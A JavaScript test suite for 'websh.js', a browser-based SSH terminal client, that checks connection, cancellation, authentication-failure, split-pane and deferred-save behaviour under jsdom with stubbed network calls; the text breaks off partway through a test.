// Adversarial tests for the new runConnect flow and showTerminateModal.
// Runs websh.js under jsdom with fetch/xterm stubbed out.
//
// IMPORTANT: websh.js declares state vars with `const`/`let` at module
// scope. In a browser script tag those do *not* attach to window — so
// `win.panes` is undefined. We read them via `win.eval('panes')`.
// Function declarations (doConnect, splitPane, ...) DO attach to window.

const fs = require('fs');
const path = require('path');
const {JSDOM} = require('jsdom');
const nodeCrypto = require('node:crypto');
// fake-indexeddb provides a pure-JS IndexedDB; constructing a fresh
// IDBFactory per test gives isolation without globalThis pollution.
const {IDBFactory, IDBKeyRange} = require('fake-indexeddb');

const REPO = path.resolve(__dirname, '..', '..');
const html = fs.readFileSync(path.join(REPO, 'index.html'), 'utf8');
const js = fs.readFileSync(path.join(REPO, 'websh.js'), 'utf8');

let passed = 0, failed = 0, failures = [];
function ok(cond, msg) {
  if (cond) { passed++; }
  else { failed++; failures.push(msg); console.log('  FAIL: ' + msg); }
}
const sleep = ms => new Promise(r => setTimeout(r, ms));

function makeFakes(win) {
  win.Terminal = class {
    constructor() {
      this.cols = 80; this.rows = 24;
      this._focusCalls = 0; this._blurCalls = 0;
      this._cursorMoveCbs = [];
      this._oscHandlers = {};
      this._selectionChangeCb = null;
      this._selection = '';
    }
    loadAddon() {} open() {} reset() {}
    focus() { this._focusCalls++; }
    blur() { this._blurCalls++; }
    write() {} dispose() {}
    onData(cb) { this._onDataCb = cb || null; return { dispose: () => { this._onDataCb = null; } }; }
    onBinary() {} onResize() {} onBell() {}
    // Real xterm calls this handler for every key event and skips ALL of
    // its own handling (including preventDefault) when it returns false -
    // which is how Ctrl+V is handed back to the browser to paste.
    attachCustomKeyEventHandler(fn) { this._customKey = fn; }
    // Real xterm paste() wraps the text in bracketed-paste markers (when
    // the app enabled the mode) and emits it via onData. The stub doesn't
    // model bracketed mode; it records the call and forwards to onData so
    // tests can assert paste routes into the input queue rather than
    // bypassing it.
    paste(data) {
      (this._pasteCalls = this._pasteCalls || []).push(data);
      if (this._onDataCb) this._onDataCb(data);
    }
    onSelectionChange(cb) {
      this._selectionChangeCb = cb;
      let self = this;
      return { dispose() { if (self._selectionChangeCb === cb) self._selectionChangeCb = null; } };
    }
    getSelection() { return this._selection; }
    _fireSelectionChange(text) {
      this._selection = text == null ? '' : text;
      if (this._selectionChangeCb) this._selectionChangeCb();
    }
    onCursorMove(cb) {
      this._cursorMoveCbs.push(cb);
      let self = this;
      return { dispose() { self._cursorMoveCbs = self._cursorMoveCbs.filter(c => c !== cb); } };
    }
    _fireCursorMove() { this._cursorMoveCbs.slice().forEach(cb => cb()); }
    // Parser exposed via getter so the OSC 52 handler in createPane finds
    // a `registerOscHandler` to attach to. Tests trigger payloads via
    // `term.parser._fireOsc(52, "<base64;data>")`.
    get parser() {
      if (!this._parser) {
        let self = this;
        this._parser = {
          registerOscHandler(id, cb) {
            self._oscHandlers[id] = cb;
            return { dispose() { delete self._oscHandlers[id]; } };
          },
          _fireOsc(id, data) {
            const cb = self._oscHandlers[id];
            return cb ? cb(data) : false;
          }
        };
      }
      return this._parser;
    }
    get buffer() { return {active: {length: 0, getLine: () => null}}; }
    get unicode() { return {activeVersion: '11'}; }
  };
  win.FitAddon = {FitAddon: class {
    activate() {} fit() {}
    proposeDimensions() { return {cols: 80, rows: 24}; }
  }};
  win.SearchAddon = {SearchAddon: class {
    constructor() {
      this.findNextCalls = [];
      this.findPrevCalls = [];
      this.clearDecorationsCalls = 0;
      this.disposeCalls = 0;
      this._resultsCb = null;
    }
    activate() {}
    findNext(query, opts) { this.findNextCalls.push({query, opts}); return true; }
    findPrevious(query, opts) { this.findPrevCalls.push({query, opts}); return true; }
    clearDecorations() { this.clearDecorationsCalls++; }
    dispose() { this.disposeCalls++; }
    onDidChangeResults(cb) {
      this._resultsCb = cb;
      let self = this;
      return { dispose() { self._resultsCb = null; } };
    }
    _fireResults(results) { if (this._resultsCb) this._resultsCb(results); }
  }};
  win.WebLinksAddon = {WebLinksAddon: class {}};
  win.Unicode11Addon = {Unicode11Addon: class {}};
  win.ResizeObserver = class { observe() {} disconnect() {} };
}

// Each plan entry: {action, match?, response, delay?, once?, fallthrough?}.
// `match` filters on the request body. `response` may be a function(body).
// `once` consumes the entry. `fallthrough` lets an unmatched entry fall
// through silently (used so we can register a "catch-all" last).
// Once its env is marked dead, a reply still in flight never settles:
// the app's own .then/.catch would otherwise run against a window that
// has already been closed. Each fetch carries the state it belongs to
// (`fn.__state`), so cleanup() can kill even a window a test built for
// itself - and never the wrong one.
function makeFetch(plan, log, state) {
  const st = state || {dead: false};
  const NEVER = new Promise(() => {});
  const dead = () => !!st.dead;
  const reply = resp => dead() ? NEVER
    : ({json: () => dead() ? NEVER : Promise.resolve(resp)});
  const fn = function(url, init) {
    const u = new URL(url, 'http://x/');
    const action = u.searchParams.get('action');
    const body = init && init.body ? JSON.parse(init.body) : null;
    log.push({action, body});
    for (let i = 0; i < plan.length; i++) {
      const p = plan[i];
      if (p.action !== action) continue;
      if (p.match && !p.match(body)) continue;
      if (p.once) plan.splice(i, 1);
      const resp = typeof p.response === 'function' ? p.response(body) : p.response;
      const d = p.delay || 1;
      return sleep(d).then(() => reply(resp));
    }
    // Keep the test moving on unexpected actions (output polls after a
    // test's assertions have already run, for example).
    return sleep(1).then(() => reply({alive: false}));
  };
  fn.__state = st;
  return fn;
}

// Expose module-scope const/let bindings from websh.js onto `window` so
// tests can inspect them. Getter for let-like vars so we see reassignments.
const EXPOSE = `
; (function(){
  Object.defineProperty(window, 'panes', {get: () => panes, configurable: true});
  Object.defineProperty(window, 'overlayMode', {get: () => overlayMode, configurable: true});
  Object.defineProperty(window, 'pendingSplit', {get: () => pendingSplit, configurable: true});
  Object.defineProperty(window, 'connectingFor', {get: () => connectingFor, configurable: true});
  Object.defineProperty(window, 'currentConnectRun', {
    get: () => currentConnectRun,
    set: v => { currentConnectRun = v; },
    configurable: true});
  Object.defineProperty(window, 'INPUT_STALL_MS', {get: () => INPUT_STALL_MS, set: v => { INPUT_STALL_MS = v; }, configurable: true});
  Object.defineProperty(window, 'OUTPUT_LAG_MS', {get: () => OUTPUT_LAG_MS, set: v => { OUTPUT_LAG_MS = v; }, configurable: true});
  Object.defineProperty(window, 'watchdogLastTick', {get: () => _watchdogLastTick, set: v => { _watchdogLastTick = v; }, configurable: true});
  for (const k of ['UPLOAD_CHUNK_BYTES', 'UPLOAD_CHUNK_TIMEOUT_MS', 'UPLOAD_RETRY_BASE_MS', 'UPLOAD_WALLCLOCK_MS'])
    Object.defineProperty(window, k, {get: () => eval(k), set: v => { eval(k + ' = v'); }, configurable: true});
  Object.defineProperty(window, 'bootReady', {get: () => bootReady, configurable: true});
  Object.defineProperty(window, 'serverConfig', {get: () => serverConfig, configurable: true});
  Object.defineProperty(window, '_idbHasKeyCache', {
    get: () => _idbHasKeyCache,
    set: v => { _idbHasKeyCache = v; },
    configurable: true,
  });
  Object.defineProperty(window, '_vaultRecentlySignedOut', {
    get: () => _vaultRecentlySignedOut,
    set: v => { _vaultRecentlySignedOut = v; },
    configurable: true,
  });
  Object.defineProperty(window, 'selectedPrompt', {get: () => selectedPrompt, configurable: true});
  Object.defineProperty(window, 'authMode', {get: () => authMode, configurable: true});
  Object.defineProperty(window, 'settings', {get: () => settings, configurable: true});
  Object.defineProperty(window, 'fontSizeVal', {get: () => fontSize, configurable: true});
  Object.defineProperty(window, '_deferredAfterLegacyModal', {
    get: () => _deferredAfterLegacyModal,
    configurable: true,
  });
})();`;

// jsdom v24 ships `crypto.getRandomValues` but not `crypto.subtle`, and it
// ships neither `TextEncoder`/`TextDecoder` nor IndexedDB. Inject them so
// vault tests can run inside the jsdom realm. We use defineProperty on
// `crypto.subtle` because the jsdom Crypto stub's `subtle` getter on the
// prototype shadows a direct assignment.
function _injectVaultGlobals(win) {
  Object.defineProperty(win.crypto, 'subtle', {
    value: nodeCrypto.webcrypto.subtle,
    configurable: true,
  });
  win.TextEncoder = TextEncoder;
  win.TextDecoder = TextDecoder;
  win.indexedDB = new IDBFactory();
  win.IDBKeyRange = IDBKeyRange;
}

async function mkEnv(plan) {
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                               url: 'http://localhost/websh/'});
  const win = dom.window;
  const log = [];
  const state = {dead: false};
  makeFakes(win);
  win.fetch = makeFetch(plan, log, state);
  _injectVaultGlobals(win);
  win.localStorage.clear();
  win.eval(js + EXPOSE);
  // Wait for boot to actually finish, not a fixed guess: a cold first
  // run (JIT, IndexedDB open) could take longer than the old 30ms, and
  // the first test then saw the form still hidden. Capped so a plan
  // whose config never answers still moves on; the trailing settle
  // keeps what the fixed sleep used to cover (restore's async tail).
  await Promise.race([win.bootReady, sleep(2000)]);
  await sleep(30);
  return {dom, win, log, state};
}

function cleanup(env) {
  try {
    const panes = env.win.panes;
    Object.keys(panes).forEach(k => {
      panes[k].polling = false;
      try { env.win.stopKeepalive(panes[k]); } catch(e) {}
    });
    try {
      if (env.win.currentConnectRun) env.win.currentConnectRun.cancelled = true;
    } catch(e) {}
    // Stop every in-flight reply from settling BEFORE the window closes
    // (see makeFetch): its continuation inside the app would otherwise
    // run against a closed window, find `document === undefined` and
    // kill the whole run - intermittently, depending on which test was
    // waiting on a reply. Leaving the window open instead is not an
    // option: two hundred dead environments' timers keep firing and
    // starve the timing-sensitive tests.
    // env.state for mkEnv; __state covers a window a test built itself
    // (and a fetch re-armed mid-test, which replaces win.fetch).
    if (env.state) env.state.dead = true;
    try { if (env.win.fetch && env.win.fetch.__state) env.win.fetch.__state.dead = true; } catch(e) {}
    env.dom.window.close();
  } catch(e) {}
}

// Close a window a test built by hand only once its boot has settled.
// fake-indexeddb runs on node's own setImmediate, which window.close()
// does not stop: a window closed mid-boot (the tests that sleep a fixed
// 30ms) later resumed loadServerConfig against a dead document, threw
// inside its .catch, and the unhandled rejection killed the whole run.
async function closeDom(dom) {
  try { await Promise.race([dom.window.bootReady, sleep(2000)]); } catch (e) {}
  dom.window.close();
}

const $ = (win, id) => win.document.getElementById(id);
const hidden = el => el.classList.contains('h');
// jsdom runScripts:outside-only doesn't execute inline onclick handlers,
// so .click() fires the event but the handler is a no-op. Evaluate the
// onclick attribute in the window context manually.
function clickBtn(win, id) {
  const el = $(win, id);
  const code = el.getAttribute('onclick');
  if (!code) throw new Error('no onclick on #' + id);
  win.eval('(function(){' + code + '}).call(document.getElementById("' + id + '"))');
}
const getPanes = win => win.panes;
const getOverlayMode = win => win.overlayMode;
const paneList = win => { const p = getPanes(win); return Object.keys(p).map(k => p[k]); };

const scenarios = [];
function test(name, fn) { scenarios.push({name, fn}); }

// =====================================================================
test('non-persistent success materializes pane and closes form', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid1', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  ok(!hidden($(win, 'ov')), 'form visible on boot');
  ok(paneList(win).length === 0, 'no pane before connect');
  $(win, 'iH').value = '10.0.0.1';
  $(win, 'iU').value = 'alex';
  $(win, 'iPw').value = 'pw';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  ok(hidden($(win, 'ov')), 'form hidden on success');
  ok(hidden($(win, 'tmuxOv')), 'popup hidden on success');
  const ps = paneList(win);
  ok(ps.length === 1, 'one pane, got ' + ps.length);
  if (ps.length) {
    ok(ps[0].sid === 'sid1', 'pane.sid, got ' + ps[0].sid);
    ok(ps[0].persistent === false, 'not persistent');
  }
  cleanup(env);
});

test('non-persistent auth-fail: popup shown, form open, no pane', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {auth_failed: true, alive: false}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '10.0.0.1'; $(win, 'iU').value = 'alex';
  $(win, 'iPw').value = 'wrong'; $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(60);
  ok(!hidden($(win, 'ov')), 'form still visible');
  ok(!hidden($(win, 'tmuxOv')), 'popup visible');
  ok(paneList(win).length === 0, 'no pane');
  ok($(win, 'tmTitle').textContent === 'Authentication failed', 'title; got=' + $(win, 'tmTitle').textContent);
  ok($(win, 'tmCancel').textContent === 'OK', 'button OK');
  clickBtn(win, 'tmCancel');
  await sleep(10);
  ok(hidden($(win, 'tmuxOv')), 'popup dismissed');
  ok(!hidden($(win, 'ov')), 'form still visible');
  cleanup(env);
});

// After dropping the tmux probe, persistent connects no longer block on
// a separate bg session. The "tmux not found" UX is reactive: the real
// connect succeeds, dies quickly, and showTmuxBar is raised by
// handleOutputPayload's regex match. The connect popup itself only sees
// the bare "connection went away" outcome here — no special title.
test('persistent + no-tmux: real connect runs (no separate probe session)', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'real-sid', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win; const log = env.log;
  $(win, 'iH').value = 'remote'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = true;
  win.doConnect();
  await sleep(80);
  // Exactly one /api/connect, NOT a bg-tagged probe call.
  const connects = log.filter(e => e.action === 'connect');
  ok(connects.length === 1, 'one connect call, got ' + connects.length);
  ok(connects[0].body && connects[0].body.background !== true,
     'connect call is NOT background-tagged');
  ok(connects[0].body && connects[0].body.persistent === true,
     'connect call is persistent');
  cleanup(env);
});

test('persistent + auth-fail at real connect: auth_failed popup, no pane', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {auth_failed: true, alive: false}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'r'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'bad';
  $(win, 'iPersistent').checked = true;
  win.doConnect();
  await sleep(120);
  ok(!hidden($(win, 'tmuxOv')), 'popup visible');
  ok($(win, 'tmTitle').textContent === 'Authentication failed', 'title');
  ok(paneList(win).length === 0, 'no pane');
  cleanup(env);
});

test('cancel during connect: run cancelled, orphan sid disconnected, form stays', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid-delayed', alive: true}, delay: 300},
    {action: 'disconnect', response: {ok: true}},
  ];
  const env = await mkEnv(plan); const win = env.win; const log = env.log;
  $(win, 'iH').value = '10.0.0.1'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(50);
  ok(!hidden($(win, 'tmuxOv')), 'connecting popup up');
  ok($(win, 'tmCancel').textContent === 'Cancel', 'button Cancel during connecting');
  clickBtn(win, 'tmCancel');
  await sleep(500);
  ok(hidden($(win, 'tmuxOv')), 'popup hidden after cancel');
  ok(!hidden($(win, 'ov')), 'form still open');
  ok(paneList(win).length === 0, 'no pane');
  const discs = log.filter(e => e.action === 'disconnect' && e.body && e.body.session_id === 'sid-delayed');
  ok(discs.length === 1, 'orphan sid disconnected once, got ' + discs.length);
  cleanup(env);
});

test('form × during split connect cancels run and closes form', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', match: b => b.host === 'seed.host',
     response: {session_id: 'seed', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'connect', match: b => b.host === '10.0.0.2',
     response: {session_id: 'split-sid', alive: true}, delay: 300, once: true},
    {action: 'disconnect', response: {ok: true}},
  ];
  const env = await mkEnv(plan); const win = env.win; const log = env.log;
  $(win, 'iH').value = 'seed.host'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const seedPs = paneList(win);
  ok(seedPs.length === 1, 'seed pane exists, got ' + seedPs.length);
  if (seedPs.length !== 1) { cleanup(env); return; }
  const seedId = seedPs[0].id;
  win.splitPane(seedId, 'h');
  await sleep(10);
  ok(!hidden($(win, 'ov')), 'form re-opens for split');
  ok(getOverlayMode(win) === 'split', "overlayMode=split, got=" + getOverlayMode(win));
  $(win, 'iH').value = '10.0.0.2'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(50);
  win.cancelConnect();
  await sleep(450);
  ok(hidden($(win, 'ov')), 'form closed by ×');
  ok(hidden($(win, 'tmuxOv')), 'popup closed');
  ok(paneList(win).length === 1, 'only seed pane, got ' + paneList(win).length);
  const discs = log.filter(e => e.action === 'disconnect' && e.body && e.body.session_id === 'split-sid');
  ok(discs.length === 1, 'split orphan disconnected, got ' + discs.length);
  cleanup(env);
});

test('saved-card: auth fail → popup, saved entry unchanged', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {auth_failed: true, alive: false}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const saved = [{name: 'myprod', host: 'prod.ex', port: 22, user: 'a',
                  auth: 'pw', pass: 'stored', persistent: false}];
  win.localStorage.setItem('websh_connections', JSON.stringify(saved));
  win.renderSaved();
  win.connectSaved(saved[0]);
  await sleep(60);
  ok(!hidden($(win, 'tmuxOv')), 'popup shown');
  ok($(win, 'tmTitle').textContent === 'Authentication failed', 'title');
  ok(paneList(win).length === 0, 'no pane');
  ok(!hidden($(win, 'ov')), 'form visible');
  const still = JSON.parse(win.localStorage.getItem('websh_connections'));
  ok(still.length === 1 && still[0].name === 'myprod', 'saved entry intact');
  cleanup(env);
});

test('server error "not allowed" → policy_deny popup', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {error: "user 'root' is not allowed for this connection"}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'x'; $(win, 'iU').value = 'root'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(60);
  ok(!hidden($(win, 'tmuxOv')), 'popup visible');
  ok($(win, 'tmTitle').textContent === 'Connection not allowed',
     'title; got=' + $(win, 'tmTitle').textContent);
  ok($(win, 'tmStatus').textContent.indexOf('not allowed') !== -1, 'status has msg');
  ok(paneList(win).length === 0, 'no pane');
  ok(!hidden($(win, 'ov')), 'form visible');
  cleanup(env);
});

test('second runConnect supersedes first in-flight', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', match: b => b.host === 'first',
     response: {session_id: 'first-sid', alive: true}, delay: 300, once: true},
    {action: 'connect', match: b => b.host === 'second',
     response: {session_id: 'second-sid', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'disconnect', response: {ok: true}},
  ];
  const env = await mkEnv(plan); const win = env.win; const log = env.log;
  $(win, 'iH').value = 'first'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(30);
  $(win, 'iH').value = 'second';
  win.doConnect();
  await sleep(500);
  const ps = paneList(win);
  ok(ps.length === 1, 'one pane, got ' + ps.length);
  if (ps.length) ok(ps[0].sid === 'second-sid', 'pane sid=second-sid, got ' + ps[0].sid);
  const discs = log.filter(e => e.action === 'disconnect' && e.body && e.body.session_id === 'first-sid');
  ok(discs.length === 1, 'first sid disconnected, got ' + discs.length);
  cleanup(env);
});

test('terminate modal uses label, not host IP', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid-t', alive: true, slot_id: 'slt1'}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '65.108.5.233';
  $(win, 'iU').value = 'alex'; $(win, 'iPw').value = 'p';
  $(win, 'iName').value = 'hetzner-hel';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const ps = paneList(win);
  ok(ps.length === 1, 'pane made, got ' + ps.length);
  if (ps.length !== 1) { cleanup(env); return; }
  const p = ps[0];
  ok(p.label === 'hetzner-hel', 'label, got ' + p.label);
  p.persistent = true; p.slotId = 'slt1';
  win.closePane(p.id);
  await sleep(20);
  ok(!hidden($(win, 'confirmOv')), 'confirm modal shown');
  const t = $(win, 'cfTitle').textContent;
  ok(t.indexOf('hetzner-hel') !== -1 && t.indexOf('65.108.5.233') === -1,
     'title uses label, not IP; got: ' + t);
  win.confirmCancel();
  cleanup(env);
});

test('ESC dismisses popup first, then form (split mode)', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', match: b => b.host === 'seed',
     response: {session_id: 'seed', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'connect', response: {auth_failed: true, alive: false}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'seed'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const seedPs = paneList(win);
  if (seedPs.length !== 1) { ok(false, 'seed pane needed for ESC test'); cleanup(env); return; }
  win.splitPane(seedPs[0].id, 'h');
  await sleep(10);
  $(win, 'iH').value = 'bad'; $(win, 'iPw').value = 'bad';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  ok(!hidden($(win, 'tmuxOv')), 'popup up after auth fail');
  // Synthesize key event on document. Some listeners hit e.target.closest,
  // so use an element (body) as the target.
  const esc = () => {
    const ev = new win.KeyboardEvent('keydown', {key: 'Escape', bubbles: true});
    win.document.body.dispatchEvent(ev);
  };
  esc(); await sleep(10);
  ok(hidden($(win, 'tmuxOv')), 'popup closed after ESC #1');
  ok(!hidden($(win, 'ov')), 'form still open after ESC #1');
  esc(); await sleep(10);
  ok(hidden($(win, 'ov')), 'form closed after ESC #2');
  cleanup(env);
});

// Reactive showTmuxBar: regex must catch the major shells' wordings.
test('showTmuxBar regex matches bash/zsh/fish/csh "tmux not found"', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: []}}];
  const env = await mkEnv(plan); const win = env.win;
  // We assert via the same boolean expression websh.js uses internally.
  // Recreate it here to lock in regression-safety on the regex.
  const re = win.eval('(/tmux: (?:command )?not found|command not found:?\\s*tmux|tmux:\\s*Command not found|Unknown command:?\\s*tmux|tmux:\\s*No such file/i)');
  const should = [
    'bash: tmux: command not found',
    'zsh: command not found: tmux',
    'Unknown command: tmux',
    'tmux: Command not found.',
    'tmux: No such file or directory',
    '/bin/sh: tmux: not found',
    'ksh: tmux: not found',
  ];
  const shouldNot = [
    'bash: foo: command not found',
    'No such file or directory',
    'permission denied',
    'connection closed',
  ];
  for (const s of should) ok(re.test(s), 'should match: ' + JSON.stringify(s));
  for (const s of shouldNot) ok(!re.test(s), 'should NOT match: ' + JSON.stringify(s));
  cleanup(env);
});

test('pendingSave: NOT committed on auth-fail shortly after connect', async () => {
  let outCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    // First output poll: empty. Second: auth_failed.
    {action: 'output', response: () => {
      outCalls++;
      if (outCalls === 1) return {data: '', alive: true};
      return {auth_failed: true, alive: false};
    }},
    {action: 'disconnect', response: {ok: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'saveme'; $(win, 'iU').value = 'alex'; $(win, 'iPw').value = 'p';
  $(win, 'iSave').checked = true;
  $(win, 'iName').value = 'savelabel';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(300);
  // Auth-failed triggers after the second poll. Saved list should be empty.
  const saved = JSON.parse(win.localStorage.getItem('websh_connections') || '[]');
  ok(saved.length === 0, 'saved entry NOT committed on quick auth fail; got ' + saved.length);
  cleanup(env);
});

test('idle session: deferred save commits via timer with no output frame', async () => {
  // The output-gated commit in handleOutputPayload only fires on a terminal
  // frame ≥2.5s after connect. Over SSE an idle session emits none, so the
  // timer armed by finalizeSuccess (scheduleSaveCommit) is the only path
  // that can land the save. Simulate it: arm the timer and never call
  // handleOutputPayload.
  let saveCalled = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                   vault_enabled: true}},
    {action: 'save', response: () => { saveCalled++; return {}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const entry = {name: 'Idle', host: 'h.example', port: 22, user: 'u',
                 auth: 'pw', persistent: false};
  Object.defineProperty(entry, '__ephemeralSecrets', {
    value: {password: 'pw', key: null, key_pass: null},
    enumerable: false, configurable: true, writable: true});
  const p = {id: 'pi', sid: 'sid-idle', pendingSave: entry,
             persistent: false, tmuxCmd: 'tmux', connectedAt: Date.now()};
  win.scheduleSaveCommit(p);
  await sleep(2800);  // > SAVE_COMMIT_DELAY_MS (2600)
  ok(saveCalled === 1,
     'idle session POSTed the deferred save via timer; got ' + saveCalled);
  ok(!p.pendingSave, 'pendingSave cleared after commit');
  cleanup(env);
});

test('deferred save timer: no-op when the session died before it fired', async () => {
  // Auth failure / disconnect nulls p.sid (and pendingSave). The timer must
  // not resurrect a save for a dead session.
  let saveCalled = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                   vault_enabled: true}},
    {action: 'save', response: () => { saveCalled++; return {}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const entry = {name: 'Dead', host: 'h', port: 22, user: 'u', auth: 'pw',
                 persistent: false};
  Object.defineProperty(entry, '__ephemeralSecrets', {
    value: {password: 'pw', key: null, key_pass: null},
    enumerable: false, configurable: true, writable: true});
  const p = {id: 'pd', sid: 'sid-dead', pendingSave: entry,
             persistent: false, tmuxCmd: 'tmux', connectedAt: Date.now()};
  win.scheduleSaveCommit(p);
  p.sid = null;        // session died before the timer fired
  await sleep(2800);
  ok(saveCalled === 0,
     'no save POST when the session died before the timer; got ' + saveCalled);
  cleanup(env);
});

test('finalizeSuccess arms the deferred-save timer when Save is ticked', async () => {
  // Wiring guard: a successful connect with Save ticked must arm
  // p.saveCommitTimer (the output-independent commit). Without the
  // scheduleSaveCommit call in finalizeSuccess, an idle SSE session never
  // saves. Checked at 120ms, well before the 2.6s timer or the 2.5s
  // output-gated commit could fire.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                   vault_enabled: true}},
    {action: 'connect', response: {session_id: 's-arm', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'save', response: {}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'Armed';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  ok(p && p.saveCommitTimer, 'finalizeSuccess armed p.saveCommitTimer');
  cleanup(env);
});

test('pendingSave survives a session-error auto-reconnect (timer re-armed)', async () => {
  // Session dies inside the 2.6s commit window → handleOutputPayload's
  // error branch runs endSession (which clears the deferred-save timer)
  // and auto-reconnects via connectPane. The success path must re-arm
  // scheduleSaveCommit against the NEW sid — otherwise an idle SSE
  // session never commits the save the user asked for.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                   vault_enabled: true}},
    {action: 'connect', response: {session_id: 's-first', alive: true}, once: true},
    {action: 'connect', response: {session_id: 's-second', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'save', response: {}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'Reconn';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  ok(!!(p && p.pendingSave), 'pendingSave armed after first connect');
  win.handleOutputPayload(p, {error: 'session not found'}, p.sid);
  await sleep(150);
  ok(p.sid === 's-second', 'auto-reconnect landed; got ' + p.sid);
  ok(!!p.pendingSave, 'pendingSave survived the reconnect');
  ok(!!p.saveCommitTimer, 'deferred-save timer re-armed for the new sid');
  cleanup(env);
});

test('deferred save timer: cleared when the pane is closed within the window', async () => {
  // Closing the pane within SAVE_COMMIT_DELAY_MS must NOT save a session the
  // user just tore down. _destroyPane leaves p.sid set (it only reads it for
  // the disconnect body), so the timer's guard wouldn't catch this — the
  // clearTimeout in _destroyPane is what does.
  let saveCalled = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                   vault_enabled: true}},
    {action: 'connect', response: {session_id: 's-close', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'disconnect', response: {ok: true}},
    {action: 'save', response: () => { saveCalled++; return {}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'Closed';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  ok(p && p.saveCommitTimer, 'timer armed before close');
  win._destroyPane(p.id, true);   // user closes the pane within the window
  await sleep(2800);
  ok(saveCalled === 0,
